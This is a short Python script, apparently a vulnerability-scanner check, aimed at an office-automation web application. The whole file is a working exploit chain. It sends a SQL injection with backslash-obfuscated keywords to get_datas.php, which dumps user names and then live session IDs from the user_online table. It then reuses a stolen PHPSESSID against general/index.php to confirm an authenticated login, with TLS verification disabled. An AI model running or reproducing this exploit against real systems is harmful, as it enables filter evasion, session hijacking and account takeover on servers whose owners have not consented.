import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def scan(baseurl):
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"general/reportshop/utils/get_datas.php?USER_ID=OfficeTask&PASSWORD=&col=1,1&tab=5 whe\\re 1={`\\='` 1} un\\ion (s\\elect user_name,byname fr\\om user whe\\re 1\\={`=` 1})-- '"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and "admin" in response.text:
		r0=True
	else:
		r0=False
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"general/reportshop/utils/get_datas.php?USER_ID=OfficeTask&PASSWORD=&col=1,1&tab=5 whe\\re 1={`\\='` 1} un\\ion (s\\elect uid,sid fr\\om user_online whe\\re 1\\={`=` 1})-- '"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 200:
		r1=True
		try:
			session=re.findall(";(?P<session>\\w+)",response.text)[0]
		except:
			session=''
	else:
		session=''
		r1=False
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"general/index.php?isIE=0&modify_pwd=0"
	headers={'Cookie': f'PHPSESSID={session}; KEY_RANDOMDATA=8491'}
	body=''
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and "/portal/home/" in response.text:
		r2=True
	else:
		r2=False
	if r0 and r1 and r2:
		return True
	else:
		return False
